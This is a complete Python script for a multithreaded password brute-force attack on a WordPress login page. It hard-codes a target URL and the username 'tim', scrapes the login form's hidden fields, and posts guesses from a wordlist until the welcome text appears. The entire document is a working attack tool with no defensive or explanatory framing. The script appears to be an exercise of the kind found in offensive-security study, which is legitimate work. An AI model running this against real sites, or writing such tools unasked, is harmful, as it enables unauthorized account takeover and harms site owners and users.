from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time


SUCCESS = 'Welcome to WordPress!'
TARGET = 'http://boodelyboo.com/wordpress/wp-login.php'

class Bruter(object):
	def __init__(self, user, url):
		self.username = user
		self.url = url
		self.found = False
		print(f"Brute Force Attack beginning on {self.url}\n")
		print(f"Finished the setup where username = %s\n" % user)

	def run_brute(self, passwords):
		for _ in range(10):
			t = threading.Thread(target=self.web_bruter, args=(passwords,))
			t.start()

	def web_bruter(self, passw):
		session = requests.Session()
		resp = session.get(self.url)
		params = get_params(resp.content)
		params['log'] = self.username

		while not passw.empty() and not self.found:
			time.sleep(5)
			passwd = passw.get()
			print(f"Trying username/password ==> {self.username} | {passwd:<10}")
			params['pwd'] = passwd

			resp1 = session.post(self.url, data=params)
			if SUCCESS in resp1.content.decode():
				self.found = True
				print('Brute force successful!\n')
				print(f'Username = {self.username}\nPassword = {passwd}\n')
				print("Cleaning up the threads...")

def get_words(wordlist):

	with open(wordlist) as f:
		raw_words = f.read()

	words = Queue()
	for word in raw_words.split():
		words.put(word)
	return words

def get_params(content):
	params = {}
	parser = etree.HTMLParser()
	tree = etree.parse(BytesIO(content), parser=parser)
	
	for elem in tree.findall('//input'):
		name = elem.get('name')
		if name is not None:
			params[name] = elem.get('value', None)
	return params


if __name__ == '__main__':
	if len(sys.argv) < 2:
		print(f'Usage:\npython3 {sys.argv[0]} /path/to/wordlist')
		sys.exit(1)
	else:
		WORDLIST = sys.argv[1]
		words = get_words(WORDLIST)
		brute = Bruter('tim', TARGET)
		brute.run_brute(words)